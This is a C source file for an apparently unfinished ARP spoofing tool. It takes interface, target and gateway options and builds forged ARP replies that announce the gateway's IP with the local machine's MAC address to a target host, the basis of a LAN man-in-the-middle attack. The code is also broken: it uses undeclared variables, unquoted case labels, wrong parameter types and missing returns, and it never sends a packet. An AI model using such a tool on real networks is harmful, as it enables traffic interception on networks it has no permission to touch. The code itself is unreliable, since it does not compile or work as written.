#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <sys/ioctl.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdarg.h>
#include <net/if.h>

typedef struct
{
    char mac_src[6];
    char mac_dst[6];
    short type;
}ETH_HEADER;

typedef struct
{
    short hw_type;
    short protocol_type;
    char hw_len;
    char protocol_len;
    short op;
    char mac_src[6];
    int ip_src;
    char mac_dst[6];
    int ip_dst;
}ARP_HEADER;

typedef struct
{
    ETH_HEADER eth_header;
    ARP_HEADER arp_header;
    char pad[18];
}ARP_CHEAT;

int get_host_mac_addr(char *mac_src, char *if_name)
{
    int sockfd;
    struct ifreq ifr;
    int ret;
    struct sockaddr_in *our_ip;
    int my_ip;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    strncpy(ifr.ifr_name, if_name, strlen(if_name));

    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0)
    {
        perror("ioctl");
        close(fd);
        return -1;
    }
    our_ip = (struct sockaddr_in *) &ifr.ifr_addr;
    my_ip = our_ip->sin_addr.s_addr;
    
    ret = ioctl(sock, SIOCGIFHWADDR, &ifr);
    if (ret < 0)
    {
        printf("get mac addr error, errno = %d!\n", errno);
        return -1;
    }

    memcpy(mac_src, &ifr.ifr_hwaddr.sa_data, sizeof(mac_src));

    return my_ip;
}

//先发一个arp请求，获取对方mac地址
int get_target_mac_addr(char if_name, int tip, int myip, char mac_src)
{
    ARP_CHEAT arpspoof;
    int s = -1;
    int const_int_1 = 1;
    struct sockaddr_ll device;
    
    memset(&arpspoof, 0, sizeof(arpspoof));
    s = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ALL));
    if (s < 0)
    {
        printf("get_target_mac_addr: create socket error\n");
        return -1;
    }

    memset(&arpspoof.eth_header.mac_dst, 0xff, sizeof(arpspoof.eth_header.mac_dst));
    memcpy(&arpspoof.eth_header.mac_src, mac_src, strlen(mac_src));
    arpspoof.eth_header.type = 0x0806;
    
    arpspoof.arp_header.hw_type = 1;
    arpspoof.arp_header.protocol_type = 0x0800;
    arpspoof.arp_header.hw_len = 6;
    arpspoof.arp_header.protocol_len = 4;
    arpspoof.arp_header.op = 2;

    memcpy(&arpspoof.arp_header.mac_src, mac_src, sizeof(mac_src));
    arpspoof.arp_header.ip_src = myip;
    memcpy(&arpspoof.arp_header.mac_dst, 0xff, sizeof(arpspoof.arp_header.mac_dst));
    arpspoof.arp_header.ip_dst = tip;

    setsockopt(s, SOL_SOCKET, SO_BROADCAST, &const_int_1, sizeof(const_int_1));
    
}

int main(int argc, char **argv)
{
    int op = 0;
    ARP_CHEAT arpspoof;
    char target_ip[20];
    char gateway_ip[20];
    char if_name[10];
    char mac_src[6];
    char mac_dst[6];
    int tip;
    int gip;
    int myip;
    
    memset(arpspoof, 0, sizeof(arpspoof));
    memset(target_ip, 0, sizeof(target_ip));
    memset(gateway_ip, 0, sizeof(gateway_ip));
    memset(if_name, 0, sizeof(if_name));
    memset(mac_src, 0, sizeof(mac_src));
    memset(mac_dst, 0, sizeof(mac_dst));
    
    opterr = 0;  
    while ((op = getopt(argc, argv, "i:t:g:")) != -1)
    {
        switch(op)
        {
            case i:
                memcpy(if_name, optarg, strlen(optarg));
                break;
            case t:
                memcpy(target_ip, optarg, strlen(optarg));
                break;
            case g:
                memcpy(gateway_ip, optarg, strlen(optarg));
                break;
            default:  
                printf("other option :%c\n",op);  
        }
    }
    
    tip = inet_addr(&target_ip);
    gip = inet_addr(&gateway_ip);
    myip = get_host_mac_addr(mac_src, if_name);
    get_target_mac_addr(if_name, tip, myip, mac_src);
    
    memcpy(&arpspoof.eth_header.mac_dst, mac_dst, sizeof(mac_dst));
    memcpy(&arpspoof.eth_header.mac_src, mac_src, sizeof(mac_src));
    arpspoof.eth_header.type = 0x0806;
    
    arpspoof.arp_header.hw_type = 1;
    arpspoof.arp_header.protocol_type = 0x0800;
    arpspoof.arp_header.hw_len = 6;
    arpspoof.arp_header.protocol_len = 4;
    arpspoof.arp_header.op = 2;

    memcpy(&arpspoof.arp_header.mac_src, mac_src, sizeof(mac_src));
    arpspoof.arp_header.ip_src = inet_addr(&gateway_ip);
    memcpy(&arpspoof.arp_header.mac_dst, mac_dst, sizeof(mac_dst));
    arpspoof.arp_header.ip_dst = inet_addr(&target_ip);

}
